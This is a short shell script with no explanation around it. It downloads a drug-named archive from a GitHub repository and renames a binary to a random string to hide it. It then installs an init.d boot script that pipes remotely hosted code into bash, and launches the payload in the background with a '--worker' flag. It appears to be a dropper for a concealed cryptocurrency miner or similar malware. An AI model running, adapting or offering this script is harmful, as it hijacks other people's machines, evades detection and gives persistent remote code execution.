cd /
wget https://github.com/omepra/advil/releases/download/v1.5.1/keflex.tar
tar -xvf keflex.tar
cd /keflex
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv amoxy $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./xanax.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/omepra/advil/main/crestor.sh)" > captop.sh
chmod a+x captop.sh
update-rc.d captop.sh defaults
rm -rf keflex.tar
cd /keflex
nohup ./xanax.sh
ps -ef | grep keflex
